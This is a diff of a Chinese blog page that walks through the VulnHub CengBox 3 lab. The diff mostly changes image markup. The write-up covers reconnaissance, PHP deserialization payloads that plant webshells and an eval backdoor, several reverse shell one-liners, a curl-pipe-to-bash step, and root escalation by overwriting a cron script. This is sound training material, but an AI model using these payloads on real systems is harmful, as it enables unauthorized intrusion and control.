@@ -117,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NCQdhk8r9ybMEzq.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/AG1hjZYM3aSKz6H.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wM1vF7Eipkbmzlg.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YxVAkEwQdF9thjc.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KopmzJq4geNSalr.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/42PBV1A3YGWyXN8.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BYav6pSg8e1GqNH.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/vGCLbdJPMhuwg3H.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/x6dgpGLH7auh2Sy.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NE8OanW5ut73GYv.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/gs6XxBVA1FQvmG4.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YEamGBSIV7f2MAH.jpg"></li>
         </ul>
       </div>
     </header>
@@ -169,210 +169,210 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
     
 
     <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VuZ2JveC0zLDU3Ni8=">https://www.vulnhub.com/entry/cengbox-3,576/</span><br>
- 教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE4MDE1OTA3">https://blog.csdn.net/weixin_50688050/article/details/118015907</span><br>
-<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3ltOTQ1L3AvMTQzMDM3MjguaHRtbA==">https://www.cnblogs.com/sym945/p/14303728.html</span></p>
+ 教程链接地址 1: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE4MDE1OTA3">https://blog.csdn.net/weixin_50688050/article/details/118015907</span><br>
+ 教程链接地址 2: <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3ltOTQ1L3AvMTQzMDM3MjguaHRtbA==">https://www.cnblogs.com/sym945/p/14303728.html</span></p>
 <h3 id="确认攻击目标"><a class="markdownIt-Anchor" href="#确认攻击目标">#</a> 确认攻击目标</h3>
 <p>攻击机 KALI： 192.168.31.135<br>
  靶机 CENGBOX3：桥接于 192.168.31.1 的网卡，ip 未知</p>
 <p>确定靶机 ip 地址和开放的端口<br>
 由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>
  <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1121.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1121.png" width="620" alt="Image">
 <p>-&gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80,443</p>
 <h3 id="网站信息收集"><a class="markdownIt-Anchor" href="#网站信息收集">#</a> 网站信息收集</h3>
 <p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuOTYv">http://192.168.31.96/</span> 进行信息收集</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1122.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1122.png" width="620" alt="Image">
 <p>打开 <span class="exturl" data-url="aHR0cHM6Ly8xOTIuMTY4LjMxLjk2Lw==">https://192.168.31.96/</span> 进行信息收集</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1123.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1123.png" width="620" alt="Image">
 <p>点击隐藏详情，输入 thisisunsafe 即可进入该站点</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1124.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1124.png" width="620" alt="Image">
 <p>扫描目录:<br>
  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.96/</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1125.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1125.png" width="660" alt="Image">
 <p>没有找到有价值的目标，得去尝试一下 443 端口的网站有没有什么敏感目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://192.168.31.96/</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1126.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1126.png" width="700" alt="Image">
 <h3 id="nmamp-端口扫描"><a class="markdownIt-Anchor" href="#nmamp-端口扫描">#</a> nmamp 端口扫描</h3>
 <blockquote>
 <p>发现 gobuster 无法爆破此类网址，只能另寻它法，按理说 web 站点必有破绽才能进一步渗透，但是现在的 web 没有任何的突破口，是不是我们从端口扫描那里就出现了问题这次通过 - A 参数详细的扫描一波端口信息，看能否获得更多的信息</p>
 </blockquote>
-<p>sudo nmap -A -p- 192.168.31.96</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1127.png" alt></p>
+<p><code>sudo nmap -A -p- 192.168.31.96</code></p>
+<img data-src="/N1h1l157/VULNHUB/image-1127.png" width="660" alt="Image">
 <p>发现了一个 ceng-company.vm 的字样，这个可以做为 hosts 做 DNS 解析，修改本地 hosts 文件，将此域名的 DNS 解析指向 ip 地址</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1128.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1128.png" width="260" alt="Image">
 <p>解析成功了，可以直接访问这个域名了，接下来就对这个域名做测试</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1129.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1129.png" width="620" alt="Image">
 <p>首先就是测试目录，看有哪些目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://ceng-company.vm/](http://ceng-company.vm/)</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1130.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1130.png" width="700" alt="Image">
 <p>还是这几个目录，没有多大的作用，下一步对域名做一个子域名扫描</p>
 <h3 id="gobuster-爆破子域名"><a class="markdownIt-Anchor" href="#gobuster-爆破子域名">#</a> gobuster 爆破子域名</h3>
 <p>爆破子域名的时候选用 vhost 参数，字典可以根据自己的习惯选择这里使用的是 seclists 中的一个子域名爆破字典<br>
  <code>gobuster vhost -u [http://ceng-company.vm/](http://ceng-company.vm/) -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1131.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1131.png" width="570" alt="Image">
 <p>也可以选用较大的字典爆破子域名  <code>gobuster vhost -u http://ceng-company.vm/ -w /usr/share/wordlists/dirb/big.txt</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1132.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1132.png" width="620" alt="Image">
 <p>找到一个子域名，同样修改本地 hosts 文件，改变 DNS 解析指向</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1133.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1133.png" width="290" alt="Image">
 <p>打开 <span class="exturl" data-url="aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0=">http://dev.ceng-company.vm</span> 做信息收集</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1134.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1134.png" width="620" alt="Image">
 <p>同样的先来做一波目录扫描</p>
 <p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.ceng-company.vm/</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1135.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1135.png" width="660" alt="Image">
 <p>没有什么敏感的目录，目录扫描无法得到更多有效的线索</p>
 <h3 id="sqlmap-注入"><a class="markdownIt-Anchor" href="#sqlmap-注入">#</a> sqlmap 注入</h3>
 <p>既然这个子域名的首页是登录框，登录框就可以尝试使用 sql 注入，通过 burp 将数据包拦截，复制该数据包</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1136.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1136.png" width="520" alt="Image">
 <p>通过 sqlmap 指定发送数据为此数据包中的内容</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1137.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1137.png" width="700" alt="Image">
 <p><code>sqlmap -r login.txt --batch --dbs</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1138.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1138.png" width="700" alt="Image">
 <p>直接爆破的时候是失败的</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1139.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1139.png" width="700" alt="Image">
 <p>指定注入点是 username 时再次尝试</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1140.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1140.png" width="700" alt="Image">
 <p>指定注入点是 passwd 时再次尝试</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1141.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1141.png" width="700" alt="Image">
 <p>前面几种方式都试了，试不出来此地方是存在 sql 注入的，没有找到其余人是怎么通过这个点拿到数据库的信息的，数据库中的信息如下，可通过下列两个账号登陆到后台</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1142.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1142.png" width="420" alt="Image">
 <p><code>admin@ceng-company.vm：admin*_2020</code> <br>
  <code>elizabethsky@ceng-company.vm：walnuttree</code></p>
 <h3 id="php反序列化漏洞"><a class="markdownIt-Anchor" href="#php反序列化漏洞">#</a> php 反序列化漏洞</h3>
 <p>进入比较高权限的 admin 的后台</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1143.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1143.png" width="660" alt="Image">
 <p>这里有一个可以输入的地方，输入 1,2,3 尝试是否有回显</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1144.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1144.png" width="660" alt="Image">
 <p>提交之后，显示发送成功，并且有一个链接可以跳转</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1145.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1145.png" width="660" alt="Image">
 <p>此链接显示了 1,3 位置的数据，我们可以放一些恶意 payload 尝试</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1146.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1146.png" width="520" alt="Image">
 <p>在输入框依次填写如下内容，看 phpinfo 是否会被执行</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1147.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1147.png" width="660" alt="Image">
 <p>回显中并没有 phpinfo 的信息，只留下来了第三个位置的数字</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1148.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1148.png" width="520" alt="Image">
 <p>把 phpinfo 放在第三个位置看看有没有什么回显</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1149.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1149.png" width="620" alt="Image">
 <p>看来 phpinfo 的信息没有被执行，跟 1,3 的位置无关</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1150.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1150.png" width="470" alt="Image">
 <p>查看源码里，只是以一种字符串的形势存在</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1151.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1151.png" width="320" alt="Image">
 <h3 id="php反序列化-get"><a class="markdownIt-Anchor" href="#php反序列化-get">#</a> php 反序列化 GET</h3>
 <p>仔细观察 url 地址，发现是一个 url 编码后的地址<br>
 通过在线 url 解码：<span class="exturl" data-url="aHR0cDovL3d3dy5hYjE3My5jb20vZW5jL3VybGVuY29kZS5waHA=">http://www.ab173.com/enc/urlencode.php</span></p>
 <p><code>http://dev.ceng-company.vm/addpoem.php?data=O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:1:&quot;1&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/poem.txt&quot;;s:8:&quot;poemName&quot;;s:1:&quot;1&quot;;&#125;s:9:&quot;poemLines&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1152.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1152.png" width="700" alt="Image">
 <p>发现这就是一个 php 反序列化漏洞，在我们要上传的 phpinfo 的地方出构造一 GET 方法，通过该 GET 方法调用 php 执行系统命令</p>
 <p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:4:&quot;ada&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/poem.php&quot;;s:8:&quot;poemName&quot;;s:47:&quot;&lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:4:&quot;adadd&quot;;&#125;</code></p>
 <p>表示往主站 poem.php 写入一个 cmd 的 GET 方法，方法中的内容用系统执行</p>
 <p>将此内容进行 url 编码后添加到 <span class="exturl" data-url="aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0vYWRkcG9lbS5waHA/ZGF0YT0=">http://dev.ceng-company.vm/addpoem.php?data=</span> 执行之后没有报错，poem.php 文件写入成功</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1153.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1153.png" width="660" alt="Image">
 <p>执行 id 方法，输出 id 的一些信息</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1154.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1154.png" width="440" alt="Image">
 <p>查看 ifconfig 的 ip 信息时，通过查看源代码也能很方便的看到</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1155.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1155.png" width="620" alt="Image">
 <p>现在这个地方已经被升级成为了 RCE 命令执行漏洞，查看服务器有下列哪些反弹 shell 的命令</p>
 <p><code>http://ceng-company.vm/poem.php?cmd=which%20python;which%20nc;which%20curl;which%20wget;which%20php</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1156.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1156.png" width="660" alt="Image">
 <p>发现存在 nc，curl，wget，php 可以依次尝试使用反弹 shell 的命令</p>
 <h3 id="反弹shell总结"><a class="markdownIt-Anchor" href="#反弹shell总结">#</a> 反弹 shell 总结</h3>
 <p><code>nc 192.168.31.84 4445 -e /bin/bash</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1157.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1157.png" width="660" alt="Image">
 <p><code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31. 84 /444 5 0&gt;&amp;1'</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1158.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1158.png" width="660" alt="Image">
 <p><code>bash -i &gt;&amp; /dev/tcp/192.168.31. 84 /444 5 0&gt;&amp;1</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1159.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1159.png" width="660" alt="Image">
 <p><code>php -r '$sock=fsockopen(&quot;192.168.31. 84 &quot;,444 5 );exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1160.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1160.png" width="660" alt="Image">
 <p>如果有服务器的话，可以直接接服务器的马执行，这里我没有开启远程公网 ip 上的服务器，就直接在本地开了一个简易的 web</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 192.168.31.25的机器上</span></span><br><span class="line">cat &gt; shell.sh &lt;&lt; EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.84/4444 0&gt;&amp;1&#x27;</span><br><span class="line">EOF</span><br><span class="line">python 3 -m httpserver 80</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 192.168.31. 84 的机器上</span></span><br><span class="line">nc - lvvp 4444</span><br></pre></td></tr></table></figure>
 <p>通过网站去执行：curl <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMjUvc2hlbGwuc2g=">http://192.168.31.25/shell.sh</span> | bash<br>
  表示加载 shell.sh 的内容之后用 bash 去执行</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1161.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1161.png" width="660" alt="Image">
 <p>最后通过 curl 的方式拿到了 webshell，利用相关代码进行标准 shell 的输出</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1162.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1162.png" width="520" alt="Image">
 <h3 id="php反序列化-post"><a class="markdownIt-Anchor" href="#php反序列化-post">#</a> php 反序列化 POST</h3>
 <p>既然我们可以通过 GET 型的注入升级为 RCE，看看有没有其他的方法，先搞一个简单的 phpinfo 给指定路径上传 phpinfo 进行执行</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1163.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1163.png" width="700" alt="Image">
 <p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:18:&quot;/var/www/html/x.php&quot;;s:8:&quot;poemName&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>
 <p>意指往主站 x.php 上打印一个<?php phpinfo();?>的记录</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1164.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1164.png" width="700" alt="Image">
 <p>url 编码后去执行这个 x.php，回显出来了 phpinfo 的信息</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1165.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1165.png" width="660" alt="Image">
 <p>用 post 型参数，上传一句话后门到主站的 y.php</p>
 <p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/y.php&quot;;s:8:&quot;poemName&quot;;s:27:&quot;&lt;?php @eval($_POST['x']);?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1166.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1166.png" width="700" alt="Image">
 <p>url 编码后通过 url 执行，成功写到网站根目录上</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1167.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1167.png" width="700" alt="Image">
 <p>POST 型木马可以通过蚁剑等工具直接链接，地址是主站的 y.php，密码是 x</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1168.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1168.png" width="660" alt="Image">
 <p>通过写如下新文件，将服务器的 shell 反弹出来<br>
  <code>&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 &gt;/tmp/f&quot;);?&gt;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1169.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1169.png" width="700" alt="Image">
 <blockquote>
 <p>指的是如果存在命名管道 /tmp/f 先删掉它，然后新建一个命名管道 /tmp/f<br>
  并且通过 cat 往命名管道中打印 /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 这个命令<br>
  /bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 表示用 sh 强制交互式执行并将输出<br>
 结果重定向，然后将输出内容反弹到 192.168.31.84 的 4445 端口上</p>
 </blockquote>
-<p><img data-src="/N1h1l157/VULNHUB/image-1170.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1170.png" width="440" alt="Image">
 <p>对终端进行调整，输出一个较为美观的终端</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1171.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1171.png" width="420" alt="Image">
 <h3 id="php反序列化-mkfifo"><a class="markdownIt-Anchor" href="#php反序列化-mkfifo">#</a> php 反序列化 mkfifo</h3>
 <p>既然可以通过 POST 间接的使用 mkfifo 注入 RCE，那么是否可以直接在 php 反序列化里边直接上传 mkfifo 的命令反弹 shell 呢，尝试一下</p>
 <p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/z.php&quot;;s:8:&quot;poemName&quot;;s:100:&quot;&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.135 4444 &gt;/tmp/f&quot;);?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1172.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1172.png" width="700" alt="Image">
 <p>提示上传成功了，但是在 z.php 执行的时候失败的，这种方法可能被过滤掉了，因此目前只有通过注入 GET 参数，在 url 界面使用 curl 反弹或者注入 POST 参数，在蚁剑中用 mkfifo 的方式反弹</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1173.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1173.png" width="700" alt="Image">
 <h3 id="tcpdump抓取数据包"><a class="markdownIt-Anchor" href="#tcpdump抓取数据包">#</a> tcpdump 抓取数据包</h3>
 <p>对 webshell 做一个 pspy 监控看有没有定时任务</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1174.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1174.png" width="520" alt="Image">
 <p>追踪定期执行的任务 /opt/login.py, 只有拿到 eric 的权限才能查看</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1175.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1175.png" width="330" alt="Image">
 <p>既然是登陆的脚本，肯定是有数据传送的，看了一下服务器上是存在 tcpdump 的，可以借用这个工具来监视数据包的传输，说不定能在数据包里有发现  <code>tcpdump -i lo -w login.pcapng</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1176.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1176.png" width="540" alt="Image">
 <p>抓了大概三分钟的数据之后将 login.pcapng 发送至 kali 上目标 webshell 上不存在 scp 命令也无法通过 python 的简易 web 打开</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1177.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1177.png" width="480" alt="Image">
 <p>就将这个文件移动到了 /var/www/html 中</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1178.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1178.png" width="520" alt="Image">
 <p>直接通过浏览器打开这个文件</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1179.png" alt></p>
-<p>页面中存在着 eric 的用户名和密码 <code>3ricThompson% 2 ACovid1</code> 9，但是后面还有一些奇怪的字符，不足以确定密码是多少，还是下载下来分析一番</p>
+<img data-src="/N1h1l157/VULNHUB/image-1179.png" width="660" alt="Image">
+<p>页面中存在着 eric 的用户名和密码 <code>3ricThompson%2ACovid19</code> ，但是后面还有一些奇怪的字符，不足以确定密码是多少，还是下载下来分析一番</p>
 <h3 id="uid0的定时任务反弹"><a class="markdownIt-Anchor" href="#uid0的定时任务反弹">#</a> UID=0 的定时任务反弹</h3>
 <p>用 kali 机器下载此文件，用 strings 分析，得到了 <code>3ricThompson%2ACovid19</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1180.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1180.png" width="420" alt="Image">
 <p>但是 %2A 出现在这个密码中很突兀，可能是编码原因导致原来的特殊符号在数据传输过程中发生了转码，解码之后得到其是 *</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1181.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1181.png" width="320" alt="Image">
 <p>用下列两个方式尝试登陆服务器拿到了 eric 的权限<br>
  <code>eric: 3ricThompson%2ACovid19</code>   <code>eric: 3ricThompson*Covid19</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1182.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1182.png" width="420" alt="Image">
 <p>找到 login.py 看到漏洞形成的原因就是因为其往本地发送了一些登陆的数据包</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1183.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1183.png" width="410" alt="Image">
 <p>在 /opt 下还有两个文件是跟 root 账户相关的，<span class="exturl" data-url="aHR0cDovL2NoZWNoLnhuLS1zaHdoYXRpc215aXAtZGUwdTMyM2dxcXRxMG4ybDVsLnB5">chech.sh 就是去执行 whatismyip.py</span>，而 whatismyip.py 就是得到公网 ip</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1184.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1184.png" width="340" alt="Image">
 <p>通过 pspy 监控，发现定期执行的 login.py 是用 UID=0 的用即 root 权限执行的</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1185.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1185.png" width="550" alt="Image">
 <p>eric 用户有对 login.py 的改写权限，改写 login.py 文件，通过 py 反弹 shell</p>
 <p><code>echo &quot;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.84',4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')&quot; &gt; login.py</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1186.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1186.png" width="520" alt="Image">
 <p>-&gt; 最终拿到了 root 用户，</p>
 <h3 id="vim全屏stty"><a class="markdownIt-Anchor" href="#vim全屏stty">#</a> vim 全屏 stty</h3>
 <p>但是我么去用 vim 包括使用命令的时候往往输入了一部分内容之后就不能在再同一行继续输入了，这个美观问题经常很头疼。</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1187.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1187.png" width="420" alt="Image">
 <blockquote>
 <p>可以重设 stty 的大小，来将反弹得到的 shell 按照自己的 shell 的 stty 来标准化，自己当前的 stty 有多大就将其改为多大<br>
 通过 python 先输出一个标准的 shell  <code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code> <br>
  输入 ctrl+z 让其后台运行<br>
 查看自己当前开启的终端的大小  <code>stty - a</code></p>
 </blockquote>
-<p><img data-src="/N1h1l157/VULNHUB/image-1188.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1188.png" width="520" alt="Image">
 <blockquote>
 <p>设置 stty 为 raw 模式，并前台启动后台运行的程序 <code>stty raw -echo;fg</code> <br>
  并输入回车两次<br>
 输入 reset 重置 stty，如提示找不到 terminal 的类型，就设置为 xterm</p>
 </blockquote>
-<p><img data-src="/N1h1l157/VULNHUB/image-1189.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1189.png" width="380" alt="Image">
